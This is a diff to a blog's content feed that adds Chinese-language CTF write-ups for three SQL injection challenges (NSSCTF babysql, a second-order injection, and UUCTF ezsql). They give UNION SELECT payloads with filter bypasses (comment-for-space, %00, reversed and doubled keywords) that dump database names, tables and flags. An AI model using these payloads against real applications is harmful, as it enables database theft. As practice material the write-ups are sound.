@@ -279,6 +279,76 @@
 <p>重启靶机</p>
 <p>登录admin&#x2F;iamcool</p>
 <p><img src="/imgs/2024%E5%B9%B48%E6%9C%887%E6%97%A511%E7%82%B959%E5%88%86.png" alt="image-20240807115943261"></p>
+<h1 id="NSSCTF-2022-Spring-Recruit-babysql"><a href="#NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="[NSSCTF 2022 Spring Recruit]babysql"></a>[NSSCTF 2022 Spring Recruit]babysql</h1><p>过滤</p>
+<p>hacker!!black_list is &#x2F;if|and|\s|#|–&#x2F;i 单引号闭合</p>
+<p>%00绕过 空格&#x2F;**&#x2F;</p>
+<p>字段一位</p>
+<p>暴库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/database();%00</span><br></pre></td></tr></table></figure>
+
+<p>test</p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();%00</span><br></pre></td></tr></table></figure>
+
+<p>string(10) “flag,users”</p>
+<p>爆列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;;%00</span><br></pre></td></tr></table></figure>
+
+<p>string(4) “flag”</p>
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&#x27;union/**/select/**/group_concat(flag)/**/from/**/flag;%00</span><br></pre></td></tr></table></figure>
+
+<p>string(63) “前有巨大宝箱,NSSCTF{629ea8c3-1d54-4eda-a425-dbb573cf61df}”</p>
+<h1 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h1><p>注册登录进去</p>
+<p>发现输进去的东西被转义</p>
+<p>这个页面放弃</p>
+<p>登录页面估计也不行</p>
+<p>注册页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select database() # /123456</span><br></pre></td></tr></table></figure>
+
+<p>闭合方式为’’</p>
+<p>然后在登录发现爆库名</p>
+<p>ctftraining</p>
+<p>爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database() # </span><br></pre></td></tr></table></figure>
+
+<p>flag,news,users</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database() # </span><br></pre></td></tr></table></figure>
+
+<p>flag</p>
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6&#x27; union select group_concat(flag) from flag # </span><br></pre></td></tr></table></figure>
+
+<p>NSSCTF{fe961858-8992-45d4-99a6-2b1427517f09}</p>
+<h1 id="UUCTF-2022-新生赛-ezsql"><a href="#UUCTF-2022-新生赛-ezsql" class="headerlink" title="[UUCTF 2022 新生赛]ezsql"></a>[UUCTF 2022 新生赛]ezsql</h1><p>输入万能密码</p>
+<p>admin‘) or 1&#x3D;1;#</p>
+<p>发现被反转了了而且or被过滤了</p>
+<p>&#x2F;&#x2F;<em>your sql:SELECT * FROM users WHERE passwd&#x3D;(‘’) AND username&#x3D;(‘#;1&#x3D;1 )���nimda’) LIMIT 0,1</em></p>
+<p><a href="https://www.abcdtools.com/reverse">https://www.abcdtools.com/reverse</a></p>
+<p>输入反转后的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;1=1 ro ) &#x27;nimda</span><br></pre></td></tr></table></figure>
+
+<p>发现登录进去了</p>
+<p>判断字段回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;2,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>
+
+<p>两位 12</p>
+<p>爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad,1 tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>
+
+<p>UUCTF</p>
+<p>or被过滤 爆表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni moorrf )(esabatad,)eman_elbat(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>
+
+<p>flag,users</p>
+<p>爆列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;)(esabatad=amehcs_elbat dna &#x27;galf&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni moorrf )(esabatad,)eman_nmuloc(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>
+
+<p>UUCTF</p>
+<p>保值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#;galf moorrf )(esabatad,)FTCUU(tacnoc_puoorrg tceles noinu )&#x27;nimda</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;Your Login name:NSSCTF{53358f22-a9b8-4397-99bd-a381194cc0d2}<br>&#x2F;&#x2F;Your Password:UUCTF</p>
 ]]></content>
       <categories>
         <category>sql刷题笔记</category>
@@ -729,7 +799,7 @@ $$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";
 
 ]]></content>
       <tags>
-        <tag>ciscn2024</tag>
+        <tag>CISCN</tag>
       </tags>
   </entry>
   <entry>
